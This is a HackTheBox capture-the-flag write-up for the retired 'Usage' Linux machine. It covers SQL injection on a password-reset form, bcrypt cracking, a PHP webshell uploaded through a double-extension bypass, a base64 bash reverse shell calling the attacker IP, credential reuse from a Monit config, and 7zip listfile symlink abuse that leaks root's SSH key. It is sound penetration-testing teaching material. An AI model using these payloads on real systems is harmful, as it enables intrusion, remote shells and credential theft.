# Usage — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Usage |
| OS | Linux (Ubuntu 22.04) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.79.46` |
| Domain | `usage.htb`, `admin.usage.htb` |
| Tools Used | Nmap, Gobuster, Burp Suite, sqlmap, john, curl, nc |
| CVEs | CVE-2023-24249 (encore/laravel-admin 1.8.18 arbitrary file upload) |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — SQLi → Hash Crack → Laravel Admin File Upload RCE](#foothold--sqli--hash-crack--laravel-admin-file-upload-rce)
- [Lateral Movement — Plaintext Credentials in .monitrc](#lateral-movement--plaintext-credentials-in-monitrc)
- [Privilege Escalation — 7zip Symlink Abuse via usage\_management](#privilege-escalation--7zip-symlink-abuse-via-usage_management)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap two-phase scan | Ports 22 (SSH) and 80 (nginx) open; redirect to `usage.htb` |
| 2 | vHost registration + web recon | `admin.usage.htb` subdomain discovered; two login panels identified |
| 3 | Account registration + boolean SQLi probe on `/forget-password` | `test' or 1=1;-- -` returns valid response — injection confirmed |
| 4 | SQLmap (`--level 3`) on saved POST request | Boolean-blind + time-based SQLi found; database `usage_blog` enumerated |
| 5 | SQLmap `--dump` on `admin_users` table | bcrypt hash for `admin` recovered |
| 6 | `john` hash crack with `rockyou.txt` | Password `whatever1` cracked in seconds |
| 7 | Login to `admin.usage.htb` as `admin:whatever1` | Laravel Admin panel — `encore/laravel-admin 1.8.18` identified (CVE-2023-24249) |
| 8 | PHP webshell uploaded as `.jpg`, renamed to `.jpg.php` via Burp intercept | Webshell accessible at `/uploads/images/shell.jpg.php` |
| 9 | Base64-encoded reverse shell triggered via webshell | Reverse shell as `dash` |
| 10 | `cat ~/.monitrc` | Plaintext password `3nc0d3d_pa$$w0rd` found for monit admin |
| 11 | `su xander` with recovered password | Lateral movement to `xander` account |
| 12 | `sudo -l` as `xander` → `(ALL) NOPASSWD: /usr/bin/usage_management` | Custom binary with 7zip backup function identified |
| 13 | `strings /usr/bin/usage_management` | 7zip command uses `-snl` flag and `-- *` glob in `/var/www/html` |
| 14 | Create `@id_rsa` file + symlink `id_rsa → /root/.ssh/id_rsa` in `/var/www/html` | 7zip reads symlink as a filelist and outputs root’s private SSH key |
| 15 | SSH as `root` using extracted private key | Full system compromise |

---

## Reconnaissance

### Nmap — Two-Phase Scan

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.79.46 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -sC -sV 10.129.79.46
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**

| Port | Service | Detail | Significance |
|------|---------|--------|--------------|
| 22/tcp | OpenSSH 8.9p1 | Ubuntu | Post-credential access point |
| 80/tcp | nginx 1.18.0 | Redirects to `usage.htb` | Entire attack surface |

### vHost Registration

```bash
Hackerpatel007_1@htb[/htb]$ echo 10.129.79.46 usage.htb | sudo tee -a /etc/hosts
```

### Web Enumeration

Browsing to `http://usage.htb` presents a blog platform with three navigation options: **Login**, **Register**, and **Admin**. The Admin link redirects to `admin.usage.htb`:

```bash
Hackerpatel007_1@htb[/htb]$ echo 10.129.79.46 admin.usage.htb | sudo tee -a /etc/hosts
```

**Two distinct applications are running:**

| vHost | URL | Purpose |
|-------|-----|---------|
| `usage.htb` | `http://usage.htb` | Public blog — user registration and login |
| `admin.usage.htb` | `http://admin.usage.htb` | Laravel Admin panel — administrator only |

---

## Foothold — SQLi → Hash Crack → Laravel Admin File Upload RCE

### Step 1 — Discover SQL Injection on /forget-password

The password reset form at `/forget-password` accepts an email address and queries the database to check if it exists. Two different responses reveal whether the email is in the database:

```
Valid email:   "We have e-mailed your password reset link to <email>"
Invalid email: "Email address does not match in our records!"
```

This binary response difference is exactly what makes this form a candidate for **boolean-based blind SQL injection**.

**Test with a classic boolean injection payload:**

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST http://usage.htb/forget-password \
  -d "_token=<csrf>&email=test' or 1=1;-- -"
```

```
We have e-mailed your password reset link to test' or 1=1;-- -
```

**SQL injection confirmed.** The `OR 1=1` forced the SQL query to evaluate as true, and the application behaved as if the email existed.

### Step 2 — Capture the POST Request with Burp Suite

Intercept the form submission in Burp Suite and save the full raw request to `reset.req`:

```
POST /forget-password HTTP/1.1
Host: usage.htb
Content-Type: application/x-www-form-urlencoded
Cookie: XSRF-TOKEN=<token>; laravel_session=<session>

_token=<csrf_value>&email=test
```

### Step 3 — Run SQLmap to Identify Injection Technique

SQLmap's default level is not aggressive enough. Add `--level 3` to expand test payloads:

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -r reset.req -p email --batch --level 3
```

```
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: ...email=test' AND 2244=(SELECT (CASE WHEN (2244=2244) THEN 2244 ELSE
    (SELECT 5858 UNION SELECT 3175) END))-- cBAs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (heavy query)
    ...

back-end DBMS: MySQL > 5.0.12
```

> **Why --level matters:** Default level tests basic payloads. Higher levels add subquery-based injections which is exactly what worked here.

### Step 4 — Enumerate Databases and Tables

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -r reset.req -p email --batch --level 3 --dbs
```

```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -r reset.req -p email --batch --level 3 \
  -D usage_blog --tables --threads=10
```

```
+------------------------+
| admin_users            |
| users                  |
| blog                   |
| ...(12 more)           |
+------------------------+
```

### Step 5 — Dump admin_users Table

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -r reset.req -p email --batch --level 3 \
  -D usage_blog -T admin_users --dump
```

```
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    |
+----+--------------------------------------------------------------+----------+
```

```bash
Hackerpatel007_1@htb[/htb]$ echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hash
```

### Step 6 — Crack the Hash with John

```bash
Hackerpatel007_1@htb[/htb]$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
whatever1        (?)

1g 0:00:00:08 DONE
```

**Password cracked: `whatever1`**

### Step 7 — Log Into the Admin Panel and Identify Vulnerable Package

Navigate to `http://admin.usage.htb` and authenticate with `admin:whatever1`. The dashboard reveals:

| Package | Version |
|---------|---------|
| encore/laravel-admin | **1.8.18** |

**CVE-2023-24249** — arbitrary file upload leading to RCE in versions prior to 1.8.19. A double extension like `.jpg.php` bypasses the upload filter while PHP still executes it.

### Step 8 — Create the PHP Webshell

```bash
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["melo"]); ?>' > shell.php
```

### Step 9 — Bypass the File Upload Filter

Navigate to `/admin/auth/setting` and try uploading `shell.php` directly — rejected. Rename to `.jpg` to pass the client-side check:

```bash
Hackerpatel007_1@htb[/htb]$ mv shell.php shell.jpg
```

The file is accepted. With **Burp Suite intercept** on, change the `filename` in the multipart request:

```
Content-Disposition: form-data; name="avatar"; filename="shell.jpg.php"
```

> **Why `.jpg.php` works:** The application's upload filter sees `.jpg` and accepts it. PHP-FPM sees `.php` at the end and executes it. The file is stored with both extensions intact and the web server hands it to the PHP interpreter because it ends in `.php`.

### Step 10 — Execute Commands via the Webshell

```
http://admin.usage.htb/uploads/images/shell.jpg.php?melo=id
```

```
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

RCE confirmed as user `dash`.

### Step 11 — Upgrade to a Reverse Shell

```bash
Hackerpatel007_1@htb[/htb]$ nc -nlvp 4444
Hackerpatel007_1@htb[/htb]$ echo -n 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1' | base64 -w 0
```

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi80NDQ0IDA+JjE=
```

Trigger via webshell:

```
http://admin.usage.htb/uploads/images/shell.jpg.php?melo=echo+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi80NDQ0IDA+JjE=+|+base64+-d+|+bash
```

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.79.46] 58174
$ id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

**Upgrade to a stable TTY:**

```bash
$ script /dev/null -c bash
```

### Step 12 — User Flag

```bash
dash@usage:~$ cat user.txt
```

```
813431468129817ff5e775ac6dfae264
```

---

## Lateral Movement — Plaintext Credentials in .monitrc

### Step 1 — Enumerate the Home Directory

```bash
dash@usage:~$ ls -al ~
```

```
-rwx------ 1 dash dash  707 Oct 26 2023 .monitrc
-rw-r----- 1 root dash   33 Aug 5 18:12 user.txt
drwx------ 2 dash dash 4096 Aug 24 2023 .ssh
```

`.monitrc` is the configuration file for **Monit** — a Unix system monitoring daemon. It is only readable by `dash` and often contains credentials for the Monit web interface.

### Step 2 — Read the .monitrc Configuration File

```bash
dash@usage:~$ cat ~/.monitrc
```

```
#Monitoring Interval in Seconds
set daemon 60

#Enable Web Access
set httpd port 2812
 use address 127.0.0.1
 allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
if cpu > 80% for 2 cycles then alert

#System Monitoring
check system usage
if memory usage > 80% for 2 cycles then alert
if cpu usage (user) > 70% for 2 cycles then alert
```

**Plaintext credentials found:** `admin:3nc0d3d_pa$$w0rd`

### Step 3 — Test Credential Reuse

```bash
dash@usage:~$ ls /home
```

```
dash  xander
```

```bash
dash@usage:~$ su xander
Password: 3nc0d3d_pa$$w0rd
```

```
id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
```

Credential reuse confirmed. SSH in for a stable session:

```bash
Hackerpatel007_1@htb[/htb]$ ssh xander@usage.htb
xander@usage.htb's password: 3nc0d3d_pa$$w0rd
xander@usage:~$
```

---

## Privilege Escalation — 7zip Symlink Abuse via usage_management

### Step 1 — Check sudo Permissions

```bash
xander@usage:~$ sudo -l
```

```
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

### Step 2 — Static Analysis with strings

```bash
xander@usage:~$ strings /usr/bin/usage_management
```

```
<...SNIP...>
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
<...SNIP...>
```

Option 1 runs `7za` from `/var/www/html` as root. The `-snl` flag stores symlinks as links (not their targets), but there is a subtlety that makes this exploitable.

### Step 3 — Verify /var/www/html is Writable

```bash
xander@usage:~$ ls -ld /var/www/html/
```

```
drwxrwxrwx 4 root xander 4096 Apr 3 12:39 /var/www/html/
```

`rwxrwxrwx` — world-writable. We can create files and symlinks inside it.

### Step 4 — Understanding the 7zip Flags and the Attack

```bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

| Flag | Meaning |
|------|---------|
| `a` | Append / add to archive |
| `-tzip` | Use ZIP format |
| `-snl` | Store symbolic links as links, not as the files they point to |
| `-- *` | Include everything in the current directory |

**The `@listfile` feature:** In 7zip, a filename starting with `@` is treated as a **listfile** — a file containing a list of file paths to compress, one per line. When 7zip encounters `@somefile`, it opens `somefile` and reads it as a list of files to include.

If `-- *` expands to include `@id_rsa`, 7zip will open `id_rsa` as a listfile. If `id_rsa` is a symlink to `/root/.ssh/id_rsa`, 7zip follows the symlink and reads the private key content. Since the key is not a valid file list, 7zip prints each line as an error — revealing the key.

This bypasses `-snl` entirely: `-snl` governs symlinks added to the archive as **entries**. Here, `id_rsa` is processed as **listfile input** before that flag applies.

### Step 5 — Execute the Exploit

```bash
xander@usage:~$ cd /var/www/html
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
```

```bash
xander@usage:/var/www/html$ ls -la | grep id_rsa
```

```
-rw-r--r-- 1 xander xander    0 Oct 05 10:30 @id_rsa
lrwxrwxrwx 1 xander xander   17 Oct 05 10:30 id_rsa -> /root/.ssh/id_rsa
```

```bash
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
```

```
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
```

### Step 6 — Extract and Clean the Private Key

Copy everything between the `BEGIN` and `END` markers, strip `: No more files` from each line:

```bash
Hackerpatel007_1@htb[/htb]$ cat > root_id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
EOF
Hackerpatel007_1@htb[/htb]$ chmod 600 root_id_rsa
```

### Step 7 — SSH as Root and Collect Root Flag

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i root_id_rsa root@usage.htb
```

```
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

root@usage:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@usage:~# cat /root/root.txt
```

```
0128aafe64e342a0f062015cd95be129
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `813431468129817ff5e775ac6dfae264` |
| Root Flag | `0128aafe64e342a0f062015cd95be129` |

---

## Lessons Learned

1. **Password reset forms are high-value SQLi targets.** The `/forget-password` endpoint checks whether a submitted email exists — a binary yes/no response that is exactly what boolean-based blind injection needs. Always test password reset, email confirmation, and “forgot username” forms for injection.

2. **SQLmap’s default level misses real vulnerabilities — know when to increase it.** When you’ve manually confirmed injection exists but SQLmap finds nothing at the default level, always try `--level 3` or `--level 5`.

3. **The Laravel Admin dashboard version disclosure is directly actionable.** `encore/laravel-admin 1.8.18` was visible on the admin panel’s own dashboard. Version 1.8.19 patched CVE-2023-24249. Checking the installed version against known CVEs is always the first step after gaining authenticated access to any admin panel.

4. **Double extension bypasses (`.jpg.php`) work when the file type check only inspects the application-level extension.** The upload filter saw `.jpg` and accepted it. PHP-FPM saw `.php` and executed it. The defence is server-side MIME type validation and storing uploads outside the web root.

5. **Never store plaintext credentials in config files in a multi-user environment.** The `.monitrc` file contained the Monit password in plaintext, reused as the `xander` OS account password. Always `cat` every dotfile in a user’s home directory after gaining initial shell access.

6. **The 7zip `@listfile` feature is a subtle but powerful arbitrary file read primitive.** When 7zip encounters `@filename` in its input, it treats it as a listfile containing paths to compress. `-snl` only governs how symlinks are stored as archive entries — it does not protect against listfile processing. Creating `@id_rsa` + `id_rsa → /root/.ssh/id_rsa` causes 7zip to read and print root’s private key as error messages.

7. **`strings` on an unknown binary is always the first static analysis step.** `strings` revealed the exact 7zip command, the working directory, and all three menu options without ever needing to disassemble the binary.

8. **Symlinks in world-writable directories controlled by non-root users are always worth investigating when privileged processes operate on those directories.** `/var/www/html` was owned by `xander` with `rwxrwxrwx`. Any time a privileged process archives or reads files from a directory a non-privileged user controls, symlink attacks become viable.

---

## Full Attack Chain Reference

```
Nmap → ports 22 (SSH), 80 (nginx → usage.htb)
        ↓
/etc/hosts → usage.htb, admin.usage.htb
        ↓
usage.htb → Register account → login → blog page (minimal attack surface)
        ↓
/forget-password email field:
  test' or 1=1;-- - → "We have e-mailed..." → SQLi confirmed
        ↓
Burp intercept → save POST request to reset.req
        ↓
sqlmap -r reset.req -p email --batch --level 3
  → boolean-blind + time-based SQLi confirmed
  → MySQL backend
        ↓
sqlmap --dbs → usage_blog
sqlmap -D usage_blog --tables → admin_users
sqlmap -D usage_blog -T admin_users --dump
  → admin : $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
        ↓
john hash --wordlist=rockyou.txt
  → whatever1 (8 seconds)
        ↓
admin.usage.htb → admin:whatever1 → Laravel Admin panel
  → encore/laravel-admin 1.8.18 → CVE-2023-24249 (arbitrary file upload)
        ↓
echo '<?php system($_GET["melo"]); ?>' > shell.php
mv shell.php shell.jpg
Upload to avatar → Burp intercept → filename="shell.jpg.php"
  → /uploads/images/shell.jpg.php deployed
        ↓
/shell.jpg.php?melo=id → uid=1000(dash) — RCE confirmed
        ↓
nc -nlvp 4444
/shell.jpg.php?melo=echo+<b64_payload>+|+base64+-d+|+bash
  → dash@usage reverse shell
  → cat ~/user.txt: 813431468129817ff5e775ac6dfae264
        ↓
cat ~/.monitrc → admin:3nc0d3d_pa$$w0rd (plaintext)
ls /home → dash, xander
su xander (3nc0d3d_pa$$w0rd) → credential reuse confirmed
ssh xander@usage.htb
        ↓
sudo -l → (ALL : ALL) NOPASSWD: /usr/bin/usage_management
strings /usr/bin/usage_management
  → chdir /var/www/html
  → /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
ls -ld /var/www/html → drwxrwxrwx (xander has full write access)
        ↓
cd /var/www/html
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
        ↓
sudo /usr/bin/usage_management → option 1 (Project Backup)
  → 7zip expands * → finds @id_rsa
  → reads id_rsa (symlink) as listfile
  → follows symlink → reads /root/.ssh/id_rsa content
  → prints each line of key as "No more files" error
        ↓
Copy key → remove ": No more files" → save as root_id_rsa
chmod 600 root_id_rsa
ssh -i root_id_rsa root@usage.htb
  → root@usage:~#
  → cat /root/root.txt: 0128aafe64e342a0f062015cd95be129
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `ports=$(nmap -p- --min-rate=1000 -T4 <IP> \| grep '^[0-9]' \| cut -d '/' -f 1 \| tr '\n' ',' \| sed s/,$//)` | Fast all-port discovery |
| `nmap -p$ports -sC -sV <IP>` | Targeted version and script scan |
| `echo "<IP> usage.htb admin.usage.htb" \| sudo tee -a /etc/hosts` | Register vHosts for local resolution |
| `curl -X POST http://usage.htb/forget-password -d "_token=<csrf>&email=test' or 1=1;-- -"` | Manual SQLi confirmation on password reset form |
| `sqlmap -r reset.req -p email --batch --level 3` | Identify injection type with expanded test payloads |
| `sqlmap -r reset.req -p email --batch --level 3 --dbs` | Enumerate all databases |
| `sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10` | Enumerate tables in target database |
| `sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump` | Dump admin credentials table |
| `echo '<hash>' > hash && john hash --wordlist=/usr/share/wordlists/rockyou.txt` | Crack bcrypt hash with John |
| `echo '<?php system($_GET["melo"]); ?>' > shell.php && mv shell.php shell.jpg` | Create webshell and rename to bypass extension filter |
| Burp intercept → change `filename="shell.jpg"` to `filename="shell.jpg.php"` | Double extension filter bypass at upload request level |
| `http://admin.usage.htb/uploads/images/shell.jpg.php?melo=id` | Verify webshell RCE |
| `nc -nlvp 4444` | Start reverse shell listener |
| `echo -n 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1' \| base64 -w 0` | Generate base64-encoded reverse shell payload |
| `cat ~/.monitrc` | Read Monit config — reveals plaintext credentials |
| `su xander` | Test credential reuse with Monit password |
| `ssh xander@usage.htb` | Stable SSH session as xander |
| `sudo -l` | Check xander’s sudo permissions |
| `strings /usr/bin/usage_management` | Static analysis — reveals 7zip command and working directory |
| `ls -ld /var/www/html/` | Confirm write access to 7zip source directory |
| `cd /var/www/html && touch @id_rsa` | Create listfile trigger — tells 7zip to read id_rsa as a file list |
| `ln -s /root/.ssh/id_rsa id_rsa` | Symlink id_rsa to root’s private SSH key |
| `sudo /usr/bin/usage_management` (option 1) | Trigger 7zip backup — outputs root’s SSH key via listfile abuse |
| `chmod 600 root_id_rsa && ssh -i root_id_rsa root@usage.htb` | Authenticate as root with extracted private key |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1595 — Active Scanning | T1595.001 — Scanning IP Blocks | Nmap two-phase scan discovering ports 22 and 80; nginx redirect to `usage.htb` identified |
| T1190 — Exploit Public-Facing Application | — | Boolean-based blind SQL injection in `/forget-password` email parameter via SQLmap (`--level 3`) |
| T1213 — Data from Information Repositories | T1213.003 — Code Repositories | SQLmap `INFORMATION_SCHEMA` enumeration; dump of `admin_users` table yielding bcrypt hash |
| T1110 — Brute Force | T1110.002 — Password Cracking | John cracking bcrypt hash against `rockyou.txt` — password `whatever1` recovered |
| T1078 — Valid Accounts | T1078.003 — Local Accounts | Admin panel access using cracked credentials `admin:whatever1` |
| T1190 — Exploit Public-Facing Application | — | CVE-2023-24249 — arbitrary file upload via double extension `.jpg.php` bypass in `encore/laravel-admin 1.8.18` |
| T1505 — Server Software Component | T1505.003 — Web Shell | PHP webshell `shell.jpg.php` deployed via avatar upload |
| T1059 — Command and Scripting Interpreter | T1059.004 — Unix Shell | Base64-encoded bash reverse shell delivered through webshell — shell as `dash` |
| T1552 — Unsecured Credentials | T1552.001 — Credentials in Files | Plaintext `admin:3nc0d3d_pa$$w0rd` found in `~/.monitrc` — reused as `xander` OS account password |
| T1021 — Remote Services | T1021.004 — SSH | SSH lateral movement to `xander` using plaintext password from `.monitrc` |
| T1548 — Abuse Elevation Control Mechanism | T1548.003 — Sudo and Sudo Caching | `xander` has `(ALL : ALL) NOPASSWD: /usr/bin/usage_management` |
| T1083 — File and Directory Discovery | — | `strings /usr/bin/usage_management` reveals 7zip command, working directory, and `-snl` flag |
| T1574 — Hijack Execution Flow | T1574.005 — Executable Installer File Permissions Weakness | 7zip `@listfile` abuse — `@id_rsa` + `id_rsa → /root/.ssh/id_rsa` symlink outputs root’s SSH private key |
| T1552 — Unsecured Credentials | T1552.004 — Private Keys | Root’s OpenSSH ED25519 private key extracted from 7zip error output |

---

*HackTheBox retired machine — writeup published after official retirement.*  
*Penetration Tester role in India | Target: January 2027*
